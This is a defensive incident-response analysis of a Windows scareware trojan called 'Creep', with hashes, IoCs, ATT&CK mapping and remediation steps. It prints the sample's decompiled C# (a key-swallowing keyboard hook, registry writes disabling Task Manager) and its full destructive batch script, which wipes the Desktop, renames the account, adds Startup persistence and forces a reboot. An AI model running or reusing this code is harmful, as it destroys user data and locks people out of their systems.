# Trojan.Win32.Diztakun.arpg (“Creep”) — Detailed analysis

Language: English | French version: [README.md](README.md)

**Sample (local file):** `000.exe.bin`  
**AV family:** Kaspersky `Trojan.Win32.Diztakun` — destructive scareware / jokeware  
**Internal name (code):** `Creep` (WPF .NET 4)  
**Sources:** .NET PE + `ilspycmd` decompile (`analysis/decompiled/`) + extracted artefacts  
**Any.RUN:** not provided  

> **Defensive / IR** analysis. The sample was **not** executed on the host.

### In one sentence (non-expert)

This is **not** ransomware that encrypts files for Bitcoin. It is **system horror theatre**: it blocks escape keys, kills the Windows desktop, floods the screen with “UR NEXT”, forces a reboot, then on next logon spams “run away” message boxes until the machine is barely usable.

| What it is **not** | What it is |
|--------------------|------------|
| File encryption / crypto ransom note | Destructive scareware (panic + UI sabotage) |
| Stealer / C2 / password theft | No network indicators in parent or drops |
| WannaCry / Conti / Spora | Admin WPF + batch + tiny MessageBox payload |

---
## 0. Summary — impact chain

| Item | Detail |
|------|--------|
| File | `000.exe.bin` |
| Type | PE32 GUI, **Mono/.NET** assembly (`v4.0.30319`), WPF |
| PE TimeDateStamp | `2016-09-22 13:02:11 UTC` |
| Namespaces / types | `Creep.App`, `Creep.MainWindow`, `Utilities.GlobalKeyboardHook` |
| UAC | Manifest `requireAdministrator` |
| Behavior | Global keyboard hook → block system keys; disable Task Manager; kill Explorer via `.bat`; Desktop spam “UR NEXT”; Startup persistence `rniw.exe`; infinite MessageBox “run away”; looping fullscreen video; forced reboot |
| Network | **No** HTTP/FTP/SMTP/onion indicators in parent or drops |

Impact chain (static):

```
000.exe (Creep / WPF, admin)
  ├─ GlobalKeyboardHook (blocks Esc, Win, Tab, Del)
  ├─ Registry: DisableTaskMgr, AutoRestartShell=0, empty wallpaper, .txt icon
  ├─ Drop %TEMP%: icon.ico, text.txt, windl.bat, one.rtf, rniw.exe, v.mp4
  └─ Process.Start(windl.bat)
        ├─ taskkill explorer.exe / taskmgr.exe
        ├─ copy rniw.exe → ProgramData\...\Startup\
        ├─ rename user account → "UR NEXT"
        ├─ wipe Desktop + spam .txt / RTF note
        ├─ attempt del WindowsApps
        └─ shutdown /f /r /t 0
              └─ (next logon) rniw.exe → loads Messager.exe
                    └─ MessageBox.Show("run away") infinite loop
```


**Why the scare works:** each layer cuts an exit (Esc/Win/TaskMgr/Explorer) while a video loops and a hidden script trashes the desktop. There is **nothing to pay** to “decrypt” files — because there is **no** encryption.


---

## 1. Sample identification

### 1.1 Hashes — `000.exe.bin`

| Algo | Value |
|------|--------|
| MD5 | `f2b7074e1543720a9a98fda660e02688` |
| SHA1 | `1029492c1a12789d8af78d54adcb921e24b9e5ca` |
| SHA256 | `4ea1f2ecf7eb12896f2cbf8683dae8546d2b8dc43cf7710d68ce99e127c0a966` |
| Size | 6,983,680 bytes (6.7 MiB) |

### 1.2 PE header

| Field | Value |
|-------|--------|
| Machine | `0x14C` (i386) |
| Sections | 3 (`.text`, `.rsrc`, `.reloc`) |
| Subsystem | 2 (WINDOWS_GUI) |
| ImageBase | `0x400000` |
| EntryPoint RVA | `0x6A9A8E` (`_CorExeMain` stub) |
| Overlay | 0 |
| Sole import | `mscoree.dll!_CorExeMain` |

| Section | VSize | RawSize | Entropy | Note |
|---------|------:|--------:|---------:|------|
| `.text` | 6,978,196 | 6,978,560 | **~0.75** | Low: IL + **~6.6 MiB managed resources** (zeros / media) |
| `.rsrc` | 4,056 | 4,096 | ~5.03 | Version + native manifest |
| `.reloc` | 12 | 512 | ~0.10 | |

### 1.3 CLR / assembly

| Field | Value |
|-------|--------|
| Runtime | `v4.0.30319` |
| Flags | `0x20003` (ILONLY + 32BITREQUIRED) |
| EntryPoint token | `0x6000012` → `Creep.App.Main` |
| Assembly Name | `000` version `0.0.0.0` |
| Module | `000.exe` |
| Managed resources | RVA `0x454C`, size **6,968,248** |

**AssemblyRef:** `mscorlib`, `PresentationFramework`, `PresentationCore`, `System.Xaml`, `System`, `System.Windows.Forms`.

**PE version info:** `FileDescription=000`, `OriginalFilename=000.exe`, versions `0.0.0.0`, empty Company/Copyright.

**PDB / author (secondary drop):** inside embedded `Messager.exe`:  
`C:\Users\FlyTech\Documents\Visual Studio 2015\Projects\Messager\Messager\obj\Debug\Messager.pdb`

---

## 2. Entry point


### What is this for? (non-expert)

At startup the WPF app does **not** show a friendly window first: it installs a **keyboard net** and runs sabotage (`WorkWorkWorkWork`) **before** loading the UI/video — so Esc / Win / Del already fail when the user panics.

`Creep.App.Main` (STAThread) builds the WPF app and opens `MainWindow.xaml`.

```csharp
[STAThread]
public static void Main()
{
    App app = new App();
    app.InitializeComponent();   // StartupUri = MainWindow.xaml
    ((Application)app).Run();
}
```

`MainWindow`’s constructor installs the keyboard hook and runs impact routine `WorkWorkWorkWork()` **before** `InitializeComponent()` (i.e. before UI / video).

```csharp
public MainWindow()
{
    Console.WriteLine("beginning!");
    gkh = new GlobalKeyboardHook();
    gkh.HookedKeys.Add((Keys)27);  // Escape
    gkh.HookedKeys.Add((Keys)91);  // LWin
    gkh.HookedKeys.Add((Keys)92);  // RWin
    gkh.HookedKeys.Add((Keys)9);   // Tab
    gkh.HookedKeys.Add((Keys)46);  // Delete
    gkh.KeyDown += new KeyEventHandler(handleKey);
    gkh.hook();
    WorkWorkWorkWork();            // drops + registry + bat
    InitializeComponent();         // UI + MediaElement
}
```

**Why this order:** block escape keys and sabotage the shell **before** the scare UI/video appears, to maximize panic and prevent Task Manager / Start menu use.

---

## 3. Init — keyboard hook, registry, drops


### What is this for? (non-expert)

Three parallel moves: (1) cut exits (system keys + Task Manager + no Explorer respawn), (2) drop tools in `%TEMP%`, (3) silently start the batch that does the visible damage.

### 3.1 `Utilities.GlobalKeyboardHook` (WH_KEYBOARD_LL)

P/Invoke `user32`: `SetWindowsHookEx(13, …)` (`WH_KEYBOARD_LL`), `CallNextHookEx`, `UnhookWindowsHookEx`; `kernel32!LoadLibrary("User32")` as `hInstance`.

For each key in `HookedKeys`, if `KeyDown` sets `Handled=true`, the hook returns `1` (event **swallowed**).

```csharp
private void handleKey(object sender, KeyEventArgs e)
{
    e.Handled = true;   // consume Esc / Win / Tab / Del system-wide
}
```

Additionally, `main_PreviewKeyDown` on the WPF window marks **all** keys `Handled` in the UI layer (redundant while the window has focus).

### 3.2 `WorkWorkWorkWork()` — registry sabotage + TEMP writes

```csharp
public void WorkWorkWorkWork()
{
    string tempPath = Path.GetTempPath();
    File.WriteAllBytes(tempPath + "icon.ico", Resources.texticon);

    // Default .txt icon → embedded icon (often “creepy”)
    RegistryKey registryKey = Registry.ClassesRoot.CreateSubKey("txtfile\\DefaultIcon");
    registryKey.SetValue("", tempPath + "icon.ico");
    registryKey.Close();

    // Clear wallpaper path
    registryKey = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
    registryKey.SetValue("Wallpaper", "");
    registryKey.Close();

    // Disable Task Manager (user policy)
    registryKey = Registry.CurrentUser.CreateSubKey(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    registryKey.SetValue("DisableTaskMgr", "1");
    registryKey.Close();

    // Prevent explorer.exe auto-restart after kill
    registryKey = Registry.LocalMachine.CreateSubKey(
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
    registryKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
    registryKey.Close();

    File.WriteAllBytes(tempPath + "text.txt", Resources.txt);
    File.WriteAllBytes(tempPath + "windl.bat", Resources.windl);
    File.WriteAllBytes(tempPath + "one.rtf", Resources.one);
    File.WriteAllBytes(tempPath + "rniw.exe", Resources.subox);

    ProcessStartInfo processStartInfo = new ProcessStartInfo(tempPath + "windl.bat");
    processStartInfo.CreateNoWindow = true;
    processStartInfo.UseShellExecute = false;
    Process.Start(processStartInfo);
}
```

| Key / value | Effect |
|-------------|--------|
| `HKCR\txtfile\DefaultIcon` = `%TEMP%\icon.ico` | All `.txt` files show malware icon |
| `HKCU\Control Panel\Desktop\Wallpaper` = `""` | Wallpaper cleared |
| `HKCU\...\Policies\System\DisableTaskMgr` = `1` | Ctrl+Shift+Esc / TaskMgr blocked |
| `HKLM\...\Winlogon\AutoRestartShell` = `0` | Explorer does not respawn after `taskkill` |

`HKCR` / `HKLM` writes explain the **`requireAdministrator`** manifest.

### 3.3 Managed resources (`Creep.Properties.Resources`)

| Resource name | Runtime drop | Size | SHA256 (extracted) | Type |
|---------------|--------------|-----:|--------------------|------|
| `texticon` | `%TEMP%\icon.ico` | 370,070 | `84a1c2713642090523f05d9fb015c537fd210d3200cadaf442bb67cf1834b356` | ICO (6 images) |
| `txt` | `%TEMP%\text.txt` | 396 | `38c889b5d7bdcb79bbcb55554c520a9ce74b5bfc29c19d1e4cb1419176c99f48` | “UR NEXT” text × N |
| `windl` | `%TEMP%\windl.bat` | 771 | `b551fba71dfd526d4916ae277d8686d83fff36d22fcf6f18457924a070b30ef7` | Destructive batch |
| `one` | `%TEMP%\one.rtf` | 403 | `e152b106733d9263d3cf175f0b6197880d70acb753f8bde8035a3e4865b31690` | Scare RTF note |
| `subox` | `%TEMP%\rniw.exe` | 78,336 | `70faa0e1498461731f873d3594f20cbf2beaa6f123a06b66f9df59a9cdf862be` | PureBasic PE + payload |
| `street` | `%TEMP%\v.mp4` | 83,233 | `95374cf300097872a546d89306374e7cf2676f7a8b4c70274245d2dccfc79443` | MP4 (UI loop) |
| `_000` | *(not referenced by MainWindow)* | 6,433,222 | `f8f30ec1b5ad0e3af77abb783c7ce9e1333c95d34ebfd7323009f21c9152b04c` | Only `0x30` (`'0'`) bytes — **padding / decoy**, never dropped |

Re-extract: `python3 extract_resources.py` (reads the `.resx` from `ilspycmd`).

---

## 4. Video / WPF UI


### What is this for? (non-expert)

While the batch works backstage, the WPF window loops `v.mp4` to fill the screen and reinforce the trapped feeling — with Esc/Win/Del already dead.

On `MediaElement` `Loaded`:

```csharp
private void video_Loaded(object sender, RoutedEventArgs e)
{
    string text = Path.GetTempPath() + "v.mp4";
    File.WriteAllBytes(text, Resources.street);
    video.set_Source(new Uri(text));
}

private void MediaElement_MediaEnded(object sender, RoutedEventArgs e)
{
    // Near-immediate rewind → infinite loop
    val.set_Position(TimeSpan.FromMilliseconds(1.0));
}
```

Goal: keep scare media in the foreground while the batch destroys the desktop and exit keys are dead.

---

## 5. Reconstructed script — `windl.bat`


### What is this for? (non-expert)

The WPF PE is the **stage director**; `windl.bat` is the **crew**. It kills the shell, plants persistence, renames the account to `UR NEXT`, wipes the desktop, spams `.txt`, tries to break `WindowsApps`, then **reboots immediately**. After reboot, harassment comes from `rniw.exe` → Messager, not Creep.

Delivered as [`windl.bat`](windl.bat) / [`artefacts/windl.bat`](artefacts/windl.bat).

```bat
@echo off
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
copy %temp%\rniw.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\rniw.exe"
wmic useraccount where name='%username%' set FullName='UR NEXT'
wmic useraccount where name='%username%' rename 'UR NEXT'
SET /a cr=0

del /f /s /q %userprofile%\Desktop\*
for /d %%p in (%userprofile%\Desktop\*) Do rd /Q /S "%%p"

:l
copy %temp%\text.txt "%userprofile%\Desktop\UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR N%cr%XT.txt"
SET /a cr=%cr%+1
if %cr%==28 copy %temp%\one.rtf %userprofile%\Desktop\OPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENME.rtf
if not %cr%==400 goto l

del /f /s /q "C:\Program Files\WindowsApps\"
shutdown /f /r /t 0
```

| Step | Action | IR impact |
|------|--------|-----------|
| 1–2 | `taskkill` explorer / taskmgr | Dead desktop; TaskMgr also registry-blocked |
| 3 | Copy `rniw.exe` → **all-users** Startup (`ProgramData`) | Persistence on next logon |
| 4–5 | `wmic` rename + FullName `UR NEXT` | User account renamed (noisy, visible) |
| 6–7 | Recursive Desktop wipe | Desktop data loss |
| 8–11 | Loop 400 `.txt` copies + RTF at `cr==28` | Visual spam + note |
| 12 | `del` `WindowsApps` | Attempted Store/UWP breakage (often partial per ACLs) |
| 13 | `shutdown /f /r /t 0` | Immediate forced reboot |

---

## 6. Scare note / text

No payment demand — psychological content only.

**`one.rtf` (excerpt):**

```
YOU ARE THE NEXT
I CAN SEE YOU
NOW ITS TOO LATE
I GOT YOU.......
YOU HAVE BEEN WARNED
DONT LOOK BEHIND YOU
```

**`text.txt`:** repeated `UR NEXT` lines.

---

## 7. Persistence payload — `rniw.exe` + `Messager.exe`


### What is this for? (non-expert)

Creep may not stay after reboot. It leaves a **Startup** reporter for all users: PureBasic host `rniw.exe` embedding .NET `Messager.exe`, which infinite-loops “run away” message boxes.

### 7.1 `rniw.exe` (drop `Resources.subox`)

| Field | Value |
|-------|--------|
| SHA256 | `70faa0e1498461731f873d3594f20cbf2beaa6f123a06b66f9df59a9cdf862be` |
| MD5 | `9232120b6ff11d48a90069b25aa30abc` |
| Type | Native PE32 GUI, **not** CLR (empty COM descriptor) |
| TimeDateStamp | `2016-05-27 14:05:04 UTC` |
| Markers | `.code` section / strings `PB_WindowID`, `PB_Hotkey` → **PureBasic** runtime |
| Static role | Host embedding a .NET PE in `RT_RCDATA` |

Resource `10 / A2958E591A23B5144A3A5437FF2F9274` = .NET PE **8192 bytes** extracted as `analysis/extracted/Messager.exe`.

> Exact PureBasic host extract/run path was **not** dynamically traced (no local exec). Startup placement + Messager payload make intent clear: post-reboot UI harassment.

### 7.2 `Messager.exe` (embedded)

| Field | Value |
|-------|--------|
| SHA256 | `dc6ee4edbbbe1116a200b928f2b62dbc55594a9f79152bbb0076161a58546c11` |
| Framework | .NET 4.5.2 |
| PDB | `...\FlyTech\...\Messager\Messager.pdb` |

```csharp
private static void Main()
{
    MessageBoxManager.OK = "run away";
    MessageBoxManager.Register();   // WH_CALLWNDPROCRET — relabel MB buttons
    while (true)
    {
        MessageBox.Show("run away", "run away",
            MessageBoxButtons.OK, MessageBoxIcon.Error);
    }
}
```

`MessageBoxManager` (spoofed `System.Windows.Forms` namespace) installs `WH_CALLWNDPROCRET`, detects `#32770` dialogs, and forces button captions (OK → `"run away"`). The `while(true)` loop **spams** error MessageBoxes until the process is killed / safe mode.

---

## 8. Cleanup / anti-recovery

| Technique | Where |
|-----------|--------|
| Disable TaskMgr | HKCU Policies registry |
| Prevent Explorer respawn | `AutoRestartShell=0` |
| Kill Explorer + TaskMgr | `windl.bat` |
| Wipe Desktop | `windl.bat` |
| Attempt wipe `WindowsApps` | `windl.bat` |
| Forced reboot | `shutdown /f /r /t 0` |
| Startup persistence | `rniw.exe` |
| Block Esc/Win/Tab/Del | `GlobalKeyboardHook` |

No event-log clearing, no VSS abuse, no disk encryption.

---

## 9. Logical timeline (static)

1. Admin launch of `000.exe`
2. LL keyboard hook + swallow keys
3. Registry writes + `%TEMP%` drops
4. Hidden `windl.bat` start
5. WPF UI loads / loops `v.mp4`
6. Batch: kill shell, Startup, rename user, spam Desktop, reboot
7. Post-reboot: Startup `rniw.exe` → Messager → infinite “run away” MessageBox

---

## 10. IoCs

### 10.1 Files

| Path / name | SHA256 |
|-------------|--------|
| `000.exe` / `000.exe.bin` | `4ea1f2ecf7eb12896f2cbf8683dae8546d2b8dc43cf7710d68ce99e127c0a966` |
| `%TEMP%\rniw.exe` / Startup `rniw.exe` | `70faa0e1498461731f873d3594f20cbf2beaa6f123a06b66f9df59a9cdf862be` |
| `Messager.exe` (resource) | `dc6ee4edbbbe1116a200b928f2b62dbc55594a9f79152bbb0076161a58546c11` |
| `%TEMP%\windl.bat` | `b551fba71dfd526d4916ae277d8686d83fff36d22fcf6f18457924a070b30ef7` |
| `%TEMP%\v.mp4` | `95374cf300097872a546d89306374e7cf2676f7a8b4c70274245d2dccfc79443` |
| `%TEMP%\icon.ico` | `84a1c2713642090523f05d9fb015c537fd210d3200cadaf442bb67cf1834b356` |
| `%TEMP%\one.rtf` | `e152b106733d9263d3cf175f0b6197880d70acb753f8bde8035a3e4865b31690` |
| `%TEMP%\text.txt` | `38c889b5d7bdcb79bbcb55554c520a9ce74b5bfc29c19d1e4cb1419176c99f48` |

### 10.2 Paths / names

- `%TEMP%\icon.ico`, `text.txt`, `windl.bat`, `one.rtf`, `rniw.exe`, `v.mp4`
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\rniw.exe`
- Desktop: `UR NEXT UR NEXT ... UR N{n}XT.txt` (n = 0..399)
- Desktop: `OPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENME.rtf`
- Renamed user account: `UR NEXT`

### 10.3 Registry

- `HKCR\txtfile\DefaultIcon` → `%TEMP%\icon.ico`
- `HKCU\Control Panel\Desktop\Wallpaper` → `""`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr` → `1`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoRestartShell` → `0`

### 10.4 Process / cmdline

- `taskkill /f /im explorer.exe`
- `taskkill /f /im taskmgr.exe`
- `wmic useraccount where name='%username%' set FullName='UR NEXT'`
- `wmic useraccount where name='%username%' rename 'UR NEXT'`
- `shutdown /f /r /t 0`
- MessageBox title/text: `run away`

### 10.5 Network

None.

---

## 11. ATT&CK (defensive mapping)

| ID | Technique | Observation |
|----|-----------|-------------|
| T1548.002 | Abuse Elevation Control | Manifest `requireAdministrator` (UAC prompt, not a bypass) |
| T1547.001 | Registry Run Keys / Startup Folder | `rniw.exe` copied to `ProgramData` Startup |
| T1112 | Modify Registry | TaskMgr, Winlogon, Wallpaper, DefaultIcon |
| T1056.001 | Input Capture (hook) | `WH_KEYBOARD_LL` — used to **block**, not log |
| T1055 | Process / UI hook | `WH_CALLWNDPROCRET` in Messager (MessageBox) |
| T1059.003 | Windows Command Shell | `windl.bat` |
| T1047 | WMI | `wmic useraccount` rename |
| T1489 | Service Stop (approx.) | Kill Explorer / TaskMgr |
| T1529 | System Shutdown/Reboot | `shutdown /f /r /t 0` |
| T1485 | Data Destruction | Desktop wipe + attempted `WindowsApps` |
| T1491.001 | Internal Defacement | “UR NEXT” spam, wallpaper, icons, MessageBox |

---

## 12. IR remediation (indicative)


### What is this for? (non-expert)

Nothing to “decrypt”. Remove persistence, restore broken settings, clean spam. Prefer offline/safe mode — Messager can make the desktop unusable.

1. Boot Safe Mode / external media; **do not** just dismiss the MessageBox.
2. Delete `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\rniw.exe` and leftover `rniw.exe` / `000.exe`.
3. Restore `AutoRestartShell=1`, remove `DisableTaskMgr`, fix Wallpaper / `txtfile\DefaultIcon`.
4. Rename the user account if still `UR NEXT`.
5. Clean `%TEMP%` (`windl.bat`, `v.mp4`, `icon.ico`, …) and Desktop spam.
6. Check `WindowsApps` / Store integrity if the `del` partially succeeded.
7. Full AV scan; rotate passwords if the user panicked and typed secrets during the scare (even though **this** sample has no stealer).

---

## 13. Analysis limits

- **No** local execution and no Any.RUN URL provided → no runtime process tree / dynamic screenshots.
- PureBasic host `rniw.exe` was not dynamically stepped; `Messager.exe` payload confirmed via resource extraction + decompilation.
- Resource `_000` (6.4 MiB of `'0'`) is unused by decompiled `MainWindow` code.
- Exact `v.mp4` / icon imagery not narrated here (files kept under `analysis/extracted/` for manual review).

---

## 14. Artefacts & deliverables

### 14.1 Compact IR kit — `artefacts/` (~112 KB)

Useful copies **without** opening all of `analysis/`. These are **malware** — do not run on the host.

| File | Role |
|------|------|
| [`windl.bat`](artefacts/windl.bat) | Destructor batch |
| [`text.txt`](artefacts/text.txt) | “UR NEXT” spam matrix |
| [`one.rtf`](artefacts/one.rtf) | Scare note |
| [`rniw.exe`](artefacts/rniw.exe) | Startup persistence (PureBasic) |
| [`Messager.exe`](artefacts/Messager.exe) | MessageBox payload (from `rniw`) |
| [`MainWindow.cs`](artefacts/MainWindow.cs) | Decompiled Creep core |

Full hashes: §10. Behaviour already in §5–§7.

### 14.2 Where to find the rest

| Item | Location |
|------|----------|
| Sample | `000.exe.bin` |
| Creep decompile | `analysis/decompiled/` |
| Messager decompile | `analysis/decompiled_messager/` |
| Decoded drops (`v.mp4`, `icon.ico`, …) | `analysis/extracted/` |
| Unused `_000` padding (6.4 MiB of `'0'`) | `analysis/extracted/` — **never** dropped by `MainWindow` |
| Re-extract script | [`extract_resources.py`](extract_resources.py) |

### 14.3 Deliverables

| File | Role |
|------|------|
| `README.md` / `README_EN.md` | FR / EN reports |
| `000.exe.bin` | Sample |
| `artefacts/` | IR kit |
| `analysis/` | Full decompile + extraction |

---

*Defensive / IR analysis — do not execute malware outside a controlled sandbox.*
